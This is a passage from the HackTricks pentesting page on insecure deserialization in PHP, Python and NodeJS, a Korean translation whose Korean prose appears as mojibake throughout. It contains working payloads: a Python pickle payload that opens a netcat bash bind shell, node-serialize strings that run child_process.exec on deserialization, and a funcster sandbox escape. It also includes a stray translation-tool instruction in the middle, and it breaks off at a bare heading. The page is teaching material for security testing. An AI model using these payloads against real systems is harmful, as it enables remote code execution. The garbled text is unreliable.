# ì—­ì§ë ¬í™”

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>


## ê¸°ë³¸ ì •ë³´

**ì§ë ¬í™”**ëŠ” ê°ì²´ë¥¼ ë³´ì¡´í•  ìˆ˜ ìˆëŠ” í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë°©ë²•ìœ¼ë¡œ ì´í•´ë©ë‹ˆë‹¤. ì´ëŠ” ê°ì²´ë¥¼ ì €ì¥í•˜ê±°ë‚˜ í†µì‹  í”„ë¡œì„¸ìŠ¤ì˜ ì¼ë¶€ë¡œ ì „ì†¡í•˜ê¸° ìœ„í•œ ëª©ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ê°ì²´ë¥¼ ë‚˜ì¤‘ì— ì¬ìƒì„±í•  ìˆ˜ ìˆë„ë¡ í•˜ì—¬ êµ¬ì¡°ì™€ ìƒíƒœë¥¼ ìœ ì§€í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

**ì—­ì§ë ¬í™”**ëŠ” ì§ë ¬í™”ì˜ ë°˜ëŒ€ ê³¼ì •ì…ë‹ˆë‹¤. íŠ¹ì • í˜•ì‹ìœ¼ë¡œ êµ¬ì¡°í™”ëœ ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ ê°ì²´ë¡œ ë‹¤ì‹œ êµ¬ì„±í•˜ëŠ” ê³¼ì •ì„ í¬í•¨í•©ë‹ˆë‹¤.

ì—­ì§ë ¬í™”ëŠ” ì ì¬ì ìœ¼ë¡œ **ê³µê²©ìê°€ ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ì¡°ì‘í•˜ì—¬ í•´ë¡œìš´ ì½”ë“œë¥¼ ì‹¤í–‰**í•˜ê±°ë‚˜ ê°ì²´ ì¬êµ¬ì„± ê³¼ì •ì—ì„œ ì˜ˆê¸°ì¹˜ ì•Šì€ ë™ì‘ì„ ìœ ë°œí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ìœ„í—˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


## PHP

PHPì—ì„œëŠ” ì§ë ¬í™” ë° ì—­ì§ë ¬í™” ê³¼ì •ì—ì„œ íŠ¹ì •í•œ ë§¤ì§ ë©”ì„œë“œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:

* `__sleep`: ê°ì²´ê°€ ì§ë ¬í™”ë  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì´ ë©”ì„œë“œëŠ” ì§ë ¬í™”ë˜ì–´ì•¼ í•˜ëŠ” ê°ì²´ì˜ ëª¨ë“  ì†ì„± ì´ë¦„ìœ¼ë¡œ êµ¬ì„±ëœ ë°°ì—´ì„ ë°˜í™˜í•´ì•¼ í•©ë‹ˆë‹¤. ë³´ë¥˜ ì¤‘ì¸ ë°ì´í„°ë¥¼ ì»¤ë°‹í•˜ê±°ë‚˜ ìœ ì‚¬í•œ ì •ë¦¬ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__wakeup`: ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì§ë ¬í™” ì¤‘ì— ì†ì‹¤ëœ ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²°ì„ ë‹¤ì‹œ ì„¤ì •í•˜ê³  ë‹¤ë¥¸ ì´ˆê¸°í™” ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__unserialize`: ì´ ë©”ì„œë“œëŠ” ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ `__wakeup` ëŒ€ì‹ ì— í˜¸ì¶œë©ë‹ˆë‹¤(ì¡´ì¬í•˜ëŠ” ê²½ìš°). `__wakeup`ì— ë¹„í•´ ì—­ì§ë ¬í™” ê³¼ì •ì— ëŒ€í•´ ë” ë§ì€ ì œì–´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
* `__destruct`: ì´ ë©”ì„œë“œëŠ” ê°ì²´ê°€ ì†Œë©¸ë˜ê±°ë‚˜ ìŠ¤í¬ë¦½íŠ¸ê°€ ì¢…ë£Œë  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ íŒŒì¼ í•¸ë“¤ì„ ë‹«ê±°ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²°ê³¼ ê°™ì€ ì •ë¦¬ ì‘ì—…ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__toString`: ì´ ë©”ì„œë“œëŠ” ê°ì²´ë¥¼ ë¬¸ìì—´ë¡œ ì²˜ë¦¬í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. íŒŒì¼ì„ ì½ê±°ë‚˜ ê¸°ëŠ¥ í˜¸ì¶œì„ ê¸°ë°˜ìœ¼ë¡œ í•˜ëŠ” ê¸°íƒ€ ì‘ì—…ì— ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ê°ì²´ì˜ í…ìŠ¤íŠ¸ í‘œí˜„ì„ ì œê³µí•©ë‹ˆë‹¤.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
ê²°ê³¼ë¥¼ ì‚´í´ë³´ë©´ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ **`__wakeup`**ê³¼ **`__destruct`** í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ëŸ¬ ê°€ì´ë“œì—ì„œëŠ” ì†ì„±ì„ ì¶œë ¥í•˜ë ¤ê³  í•  ë•Œ **`__toString`** í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ëŠ” ê²ƒìœ¼ë¡œ ì•Œë ¤ì ¸ ìˆì§€ë§Œ, í˜„ì¬ëŠ” ê·¸ë ‡ì§€ ì•Šì€ ê²ƒ ê°™ìŠµë‹ˆë‹¤.

{% hint style="warning" %}
í´ë˜ìŠ¤ì— êµ¬í˜„ëœ ê²½ìš° **`__wakeup()`** ëŒ€ì‹  **`__unserialize(array $data)`** ë©”ì„œë“œê°€ í˜¸ì¶œë©ë‹ˆë‹¤. ì´ ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ë°°ì—´ë¡œ ì œê³µí•˜ì—¬ ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì†ì„±ì„ ì—­ì§ë ¬í™”í•˜ê³  ì—­ì§ë ¬í™” í›„ í•„ìš”í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

ë‹¤ìŒì€ í•´í‚¹ ê¸°ë²•ì— ê´€í•œ ë‚´ìš©ì…ë‹ˆë‹¤. ë‹¤ìŒ ë‚´ìš©ì€ íŒŒì¼ /hive/hacktricks/pentesting-web/deserialization/README.mdì—ì„œ ê°€ì ¸ì˜¨ ê²ƒì…ë‹ˆë‹¤. ê´€ë ¨ëœ ì˜ì–´ í…ìŠ¤íŠ¸ë¥¼ í•œêµ­ì–´ë¡œ ë²ˆì—­í•˜ê³ , ì •í™•íˆ ë™ì¼í•œ ë§ˆí¬ë‹¤ìš´ ë° HTML êµ¬ë¬¸ì„ ìœ ì§€í•œ ì±„ ë²ˆì—­ì„ ë°˜í™˜í•˜ì„¸ìš”. ì½”ë“œ, í•´í‚¹ ê¸°ë²• ì´ë¦„, í•´í‚¹ ê´€ë ¨ ìš©ì–´, í´ë¼ìš°ë“œ/SaaS í”Œë«í¼ ì´ë¦„(ì˜ˆ: Workspace, aws, gcp...), 'leak'ì´ë¼ëŠ” ë‹¨ì–´, pentesting ë° ë§ˆí¬ë‹¤ìš´ íƒœê·¸ì™€ ê°™ì€ ë‚´ìš©ì€ ë²ˆì—­í•˜ì§€ ë§ˆì„¸ìš”. ë˜í•œ ë²ˆì—­ ë° ë§ˆí¬ë‹¤ìš´ êµ¬ë¬¸ ì´ì™¸ì˜ ì¶”ê°€ ë‚´ìš©ì€ ì¶”ê°€í•˜ì§€ ë§ˆì„¸ìš”.

{% endhint %}

**PHP ì˜ˆì œë¥¼ ì—¬ê¸°ì—ì„œ** ì„¤ëª…ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ì—¬ê¸° [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ë˜ëŠ” ì—¬ê¸° [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

PHP autoload ê¸°ëŠ¥ì„ ì•…ìš©í•˜ì—¬ ì„ì˜ì˜ php íŒŒì¼ì„ ë¡œë“œí•˜ê³  ë” ë§ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### ì°¸ì¡° ê°’ ì§ë ¬í™”

ì–´ë–¤ ì´ìœ ë¡œ ì¸í•´ ê°’ì´ **ë‹¤ë¥¸ ê°’ì— ëŒ€í•œ ì°¸ì¡°ë¡œ ì§ë ¬í™”**ë˜ê¸¸ ì›í•œë‹¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (PHPìš© ysoserial)

[**PHPGGC**](https://github.com/ambionics/phpggc)ëŠ” PHP ì—­ì§ë ¬í™”ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•œ í˜ì´ë¡œë“œ ìƒì„±ì„ ë„ì™€ì¤ë‹ˆë‹¤.\
ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì†ŒìŠ¤ ì½”ë“œì—ì„œ ì—­ì§ë ¬í™”ë¥¼ ì•…ìš©í•  ë°©ë²•ì„ ì°¾ì„ ìˆ˜ ì—†ëŠ” ê²½ìš°ë„ ìˆì§€ë§Œ, ì™¸ë¶€ PHP í™•ì¥ì˜ ì½”ë“œë¥¼ ì•…ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ, ê°€ëŠ¥í•˜ë‹¤ë©´ ì„œë²„ì˜ `phpinfo()`ë¥¼ í™•ì¸í•˜ê³  ì¸í„°ë„·(ë˜ëŠ” **PHPGGC**ì˜ **ê°€ì ¯**)ì—ì„œ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥í•œ ê°€ì ¯ì„ ì°¾ì•„ë³´ì„¸ìš”.

### phar:// ë©”íƒ€ë°ì´í„° ì—­ì§ë ¬í™”

íŒŒì¼ì„ ì½ê³  ê·¸ ì•ˆì— ìˆëŠ” PHP ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šê³  íŒŒì¼ì„ ì½ëŠ” LFIë¥¼ ì°¾ì•˜ë‹¤ë©´, ì˜ˆë¥¼ ë“¤ì–´ _**file\_get\_contents(), fopen(), file() ë˜ëŠ” file\_exists(), md5\_file(), filemtime() ë˜ëŠ” filesize()**_**ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°** phar í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ì½ì„ ë•Œ ë°œìƒí•˜ëŠ” **ì—­ì§ë ¬í™”**ë¥¼ ì•…ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒ ê²Œì‹œë¬¼ì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

ê°ì²´ê°€ ì–¸í”¼í´ë  ë•Œ _\_\_reduce\_\__ í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.\
ì•…ìš©ë˜ë©´ ì„œë²„ê°€ ì˜¤ë¥˜ë¥¼ ë°˜í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
ë” ë§ì€ ì •ë³´ë¥¼ ì–»ìœ¼ë ¤ë©´ **pickle jails**ì—ì„œ íƒˆì¶œí•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

ë‹¤ìŒ í˜ì´ì§€ëŠ” **yamls** íŒŒì´ì¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì•ˆì „í•˜ì§€ ì•Šì€ ì—­ì§ë ¬í™”ë¥¼ ë‚¨ìš©í•˜ëŠ” ê¸°ìˆ ì„ ì†Œê°œí•˜ë©°, **Pickle, PyYAML, jsonpickle ë° ruamel.yaml**ì— ëŒ€í•œ RCE ì—­ì§ë ¬í™” í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë„êµ¬ë¡œ ë§ˆë¬´ë¦¬ë©ë‹ˆë‹¤:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### í´ë˜ìŠ¤ ì˜¤ì—¼ (Python í”„ë¡œí† íƒ€ì… ì˜¤ì—¼)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JSì—ëŠ” PHPë‚˜ Pythonê³¼ ê°™ì´ **"ë§ˆë²•" í•¨ìˆ˜**ê°€ ì—†ìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í•¨ìˆ˜ëŠ” ê°ì²´ë¥¼ ìƒì„±í•˜ê¸° ìœ„í•´ ì§ì ‘ í˜¸ì¶œë˜ì§€ ì•Šë”ë¼ë„ **ìì£¼ ì‚¬ìš©ë˜ëŠ” í•¨ìˆ˜**ì¸ **`toString`**, **`valueOf`**, **`toJSON`**ê³¼ ê°™ì€ í•¨ìˆ˜ê°€ ìˆìŠµë‹ˆë‹¤.\
ì—­ì§ë ¬í™”ë¥¼ ë‚¨ìš©í•œë‹¤ë©´ ì´ëŸ¬í•œ í•¨ìˆ˜ë¥¼ **ì†ìƒì‹œì¼œ ë‹¤ë¥¸ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ ë‚¨ìš©í•  ìˆ˜ë„ ìˆìŒ). ì´ëŸ¬í•œ í•¨ìˆ˜ê°€ í˜¸ì¶œë  ë•Œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í•¨ìˆ˜ë¥¼ **ì§ì ‘ í˜¸ì¶œí•˜ì§€ ì•Šê³ ë„ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” "ë§ˆë²•" ë°©ë²•**ì€ **ë¹„ë™ê¸° í•¨ìˆ˜** (í”„ë¡œë¯¸ìŠ¤)ì—ì„œ ë°˜í™˜ë˜ëŠ” ê°ì²´ë¥¼ ì†ìƒì‹œí‚¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì™œëƒí•˜ë©´, ê·¸ **ë°˜í™˜ ê°ì²´**ë¥¼ ë‹¤ë¥¸ **í”„ë¡œë¯¸ìŠ¤**ë¡œ **ë³€í™˜**í•˜ê³ , **"then"**ì´ë¼ëŠ” **í•¨ìˆ˜ í˜•ì‹ì˜ ì†ì„±**ì„ ê°€ì§„ë‹¤ë©´, ë‹¤ë¥¸ í”„ë¡œë¯¸ìŠ¤ì—ì„œ ë°˜í™˜ë˜ì—ˆê¸° ë•Œë¬¸ì— í•´ë‹¹ í•¨ìˆ˜ê°€ **ì‹¤í–‰**ë  ê²ƒì…ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ [_**ì´ ë§í¬**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/)ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__`ì™€ `prototype` ì˜¤ì—¼

ì´ ê¸°ìˆ ì— ëŒ€í•´ ì•Œê³  ì‹¶ë‹¤ë©´ **ë‹¤ìŒ íŠœí† ë¦¬ì–¼ì„ í™•ì¸í•˜ì„¸ìš”**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” í•¨ìˆ˜ë¥¼ ì§ë ¬í™”í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì˜ˆì‹œ:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**ì§ë ¬í™”ëœ ê°ì²´**ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë³´ì¼ ê²ƒì…ë‹ˆë‹¤:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
ì˜ˆì œì—ì„œëŠ” í•¨ìˆ˜ê°€ ì§ë ¬í™”ë  ë•Œ `_$$ND_FUNC$$_` í”Œë˜ê·¸ê°€ ì§ë ¬í™”ëœ ê°ì²´ì— ì¶”ê°€ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`node-serialize/lib/serialize.js` íŒŒì¼ ì•ˆì—ë„ ë™ì¼í•œ í”Œë˜ê·¸ì™€ ì½”ë“œê°€ ì‚¬ìš©ë˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

ë§ˆì§€ë§‰ ì½”ë“œ ì²­í¬ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, **í”Œë˜ê·¸ê°€ ë°œê²¬ë˜ë©´** `eval`ì„ ì‚¬ìš©í•˜ì—¬ í•¨ìˆ˜ë¥¼ ì—­ì§ë ¬í™”í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ê¸°ë³¸ì ìœ¼ë¡œ **ì‚¬ìš©ì ì…ë ¥ì´ `eval` í•¨ìˆ˜ ë‚´ì—ì„œ ì‚¬ìš©**ë©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜, í•¨ìˆ˜ë¥¼ **ë‹¨ìˆœíˆ ì§ë ¬í™”**í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œëŠ” ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì½”ë“œì˜ ì¼ë¶€ê°€ **`y.rce`ë¥¼ í˜¸ì¶œ**í•´ì•¼ í•˜ëŠ”ë°, ì´ëŠ” ë§¤ìš° **ë¶ˆê°€ëŠ¥í•œ** ì¼ì…ë‹ˆë‹¤.\
ê·¸ë˜ë„ ì§ë ¬í™”ëœ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ ì§ë ¬í™”ëœ í•¨ìˆ˜ê°€ ìë™ìœ¼ë¡œ ì‹¤í–‰ë˜ë„ë¡ í•˜ë ¤ë©´ ì§ë ¬í™”ëœ ê°ì²´ì— **ê´„í˜¸ë¥¼ ì¶”ê°€**í•˜ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤.\
ë‹¤ìŒ ì½”ë“œ ì²­í¬ì—ì„œ **ë§ˆì§€ë§‰ ê´„í˜¸**ì™€ `unserialize` í•¨ìˆ˜ê°€ ì½”ë“œë¥¼ ìë™ìœ¼ë¡œ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ì£¼ëª©í•˜ì„¸ìš”.
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
ì´ì „ì— ì–¸ê¸‰í•œ ëŒ€ë¡œ, ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” `_$$ND_FUNC$$_` ì´í›„ì˜ ì½”ë“œë¥¼ ê°€ì ¸ì™€ `eval`ì„ ì‚¬ìš©í•˜ì—¬ **ì‹¤í–‰**í•©ë‹ˆë‹¤. ë”°ë¼ì„œ **ì½”ë“œë¥¼ ìë™ìœ¼ë¡œ ì‹¤í–‰**í•˜ê¸° ìœ„í•´ í•¨ìˆ˜ ìƒì„± ë¶€ë¶„ê³¼ ë§ˆì§€ë§‰ ê´„í˜¸ë¥¼ **ì‚­ì œ**í•˜ê³  ë‹¤ìŒ ì˜ˆì‹œì™€ ê°™ì´ JS ì›ë¼ì´ë„ˆë¥¼ **ì§ì ‘ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
[**ì—¬ê¸°ì—ì„œ**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ **ì¶”ê°€ ì •ë³´**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**ì˜ ì£¼ëª©í• ë§Œí•œ ì¸¡ë©´ì€ **í‘œì¤€ ë‚´ì¥ ê°ì²´ì— ëŒ€í•œ ì ‘ê·¼ ë¶ˆê°€ëŠ¥ì„±**ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ì œí•œìœ¼ë¡œ ì¸í•´ ë‚´ì¥ ê°ì²´ì˜ ë©”ì†Œë“œë¥¼ í˜¸ì¶œí•˜ë ¤ëŠ” ì½”ë“œ ì‹¤í–‰ì´ ë¶ˆê°€ëŠ¥í•˜ë©°, `console.log()` ë˜ëŠ” `require(something)`ê³¼ ê°™ì€ ëª…ë ¹ì„ ì‚¬ìš©í•  ë•Œ `"ReferenceError: console is not defined"`ê³¼ ê°™ì€ ì˜ˆì™¸ê°€ ë°œìƒí•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì´ ì œí•œì„ ìš°íšŒí•˜ì—¬ ì „ì—­ ì»¨í…ìŠ¤íŠ¸ì™€ ëª¨ë“  í‘œì¤€ ë‚´ì¥ ê°ì²´ì— ëŒ€í•œ ì™„ì „í•œ ì•¡ì„¸ìŠ¤ë¥¼ ë³µì›í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì „ì—­ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì§ì ‘ í™œìš©í•¨ìœ¼ë¡œì¨ ì´ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ìŠ¤ë‹ˆí«ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ ë³µì›í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**ë” ë§ì€ ì •ë³´ëŠ” [ì´ ì†ŒìŠ¤](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

